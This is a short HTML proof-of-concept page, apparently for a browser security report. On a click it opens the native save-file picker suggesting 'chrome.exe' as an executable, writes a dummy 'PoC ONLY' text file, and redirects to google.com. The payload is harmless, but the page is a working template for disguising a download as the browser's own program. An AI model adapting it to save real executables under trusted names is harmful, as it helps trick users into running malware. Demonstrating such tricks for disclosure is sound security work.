<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC</title>
</head>
<body>

<h1>Click anywhere</h1>

<script>
document.addEventListener('click', async () => {
    if (!('showSaveFilePicker' in window)) return;

    try {
        // 1. Save File Picker (Google / Chrome native)
        const handle = await window.showSaveFilePicker({
            suggestedName: 'chrome.exe',
            types: [{
                description: 'Executable File (PoC)',
                accept: {
                    'application/octet-stream': ['.exe']
                }
            }]
        });

        // 2. Write dummy content
        const writable = await handle.createWritable();
        await writable.write(
            'PoC ONLY\r\n' +
            'This is NOT a real executable\r\n' +
            'Demonstration file'
        );
        await writable.close();

        // 3. Redirect setelah selesai
        setTimeout(() => {
            window.location.assign('https://www.google.com/');
        }, 500);

    } catch (e) {
        // user cancel = expected
    }
}, { once: true });
</script>

</body>
</html>
